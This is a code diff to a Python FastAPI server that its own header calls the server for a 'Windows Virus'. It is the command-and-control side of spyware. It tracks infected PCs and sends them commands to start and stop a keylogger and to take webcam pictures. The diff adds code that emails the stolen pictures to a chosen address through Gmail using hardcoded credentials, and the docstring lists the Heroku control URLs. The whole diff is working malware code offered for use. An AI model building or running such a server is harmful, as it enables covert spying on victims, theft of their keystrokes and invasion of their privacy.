@@ -1,3 +1,18 @@
+"""
+
+    Ron Elmekiesse, 29.9.2020.
+    This is the server for the Windows Virus, just run it as any python program (:
+
+    The main server runs on heroku with the name "my-server-virus-commander".
+
+    Commands:
+    "https://my-server-virus-commander.herokuapp.com/first_commit" -> will display all the pc's names that got virus on them, choose a name and send to him the commands.
+    "https://my-server-virus-commander.herokuapp.com/{pc_name}/take_picture/{email_address_to_send}" -> will take a picture from you'r web cam and will send it to the email address given.
+    "https://my-server-virus-commander.herokuapp.com/{pc_name}/start_key_logger" -> will start key logger on the pc_name given.
+    "https://my-server-virus-commander.herokuapp.com/{pc_name}/stop_key_logger" -> will stop the key logger on the pc_name given and will display it on the browser.
+
+"""
+
 from fastapi import FastAPI, Request
 
 from pydantic import BaseModel
@@ -8,6 +23,14 @@ from os import path
 import os
 import json
 from fastapi.responses import FileResponse
+
+import smtplib
+import imghdr
+from email.message import EmailMessage
+
+import threading
+
+import time
 
 app = FastAPI()
 
@@ -29,6 +52,52 @@ class Picture_Data(BaseModel):
 class Key_Logger_Data(BaseModel):
     key_logger: str
 
+
+email = "virus.c123456789@gmail.com"
+password = "virus123456789"
+
+
+def send_picture_email(pc_name: str, email_to_send: str):
+    # waiting for the photo to come back
+    print('in send email func!!!!!')
+    email_to_send = email_to_send.split('%40')
+
+    email_to_send = ('@').join(email_to_send)
+
+
+    print(f'email to send: {email_to_send}')
+
+    while True:
+        print('looking for the image')
+        print(f'email to send: {email_to_send}')
+        if path.exists(f"transferred_picture_{pc_name}.bmp"):
+            try:
+                #creating the msg
+                msg = EmailMessage()
+                msg['Subject'] = 'The Secret Picture'
+                msg['From'] = email
+                msg['To'] = email_to_send
+                msg.set_content('image.....')
+
+                # copying the picture content and removing the main picture.
+                with open(f"transferred_picture_{pc_name}.bmp", "rb") as f:
+                    file_data = f.read()
+                    file_type = imghdr.what(f.name)
+                    file_name = f.name
+
+                msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)
+
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+                    smtp.login(email, password)
+                    smtp.send_message(msg)
+
+                print('Sent picture threw email (:')
+
+            finally:
+                # remove the main picture.
+                os.remove(f"transferred_picture_{pc_name}.bmp")
+                break
+        time.sleep(5)
 
 
 # When the client / admin opens the server web.
@@ -55,9 +124,6 @@ async def first_connection(data: Data):
     with open ("./DB.json", "w") as file_ptr:
         json.dump(file, file_ptr)
 
-    # writing a file with the pc name for the client uses.
-    with open("pc_name.txt", "w") as file_ptr:
-        file_ptr.write(data.pc_name)
 
     return True # returns True to make sure everything is ok -> return that the server got the message / first connection packet
 
@@ -127,11 +193,9 @@ async def first_connection():
             print(lst_pc_names)
         return (f"pc names: | >> {(' << | >> ').join(lst_pc_names)} << |")
 
-
-
 # if the client wants to take a picture
-@app.get("/{pc_name}/take_picture")
-async def take_picture(pc_name: str):
+@app.get("/{pc_name}/take_picture/{email_to_send}")
+async def take_picture(pc_name: str, email_to_send: str):
 
     with open("DB.json", "r") as file_ptr:
         file = json.load(file_ptr) ## reading the json file
@@ -140,24 +204,16 @@ async def take_picture(pc_name: str):
     if "WebCam" not in file[pc_name]["commands"]:
         file[pc_name]["commands"].append("WebCam")
 
-    with open("DB.json", "w") as file_ptr:
+    with open ("DB.json", "w") as file_ptr:
         json.dump(file, file_ptr)
     print("pro picture")
-    # waiting for the photo to come back
-    while True:
-        if path.exists(f"transferred_picture_{pc_name}.bmp"):
-            try:
-                # copying the picture content and removing the main picture.
-                with open(f"transferred_picture_{pc_name}.bmp", "rb") as file_ptr:
-                    with open("temp_picture.bmp", "wb") as temp_file_ptr:
-                        temp_file_ptr.write(file_ptr.read())
-                return FileResponse("temp_picture.bmp")
-            finally:
-                # remove the main picture.
-                os.remove(f"transferred_picture_{pc_name}.bmp")
 
-        await asyncio.sleep(5)  # sleep 5 seconds for other commands to come
-# image response
+    # function to send the picture threw the email -> starts a new thread.
+    x = threading.Thread(target=send_picture_email, args=(pc_name, email_to_send))
+
+    x.start()
+
+    return "The picture will appear in your mail in a minute! "
 
 
 
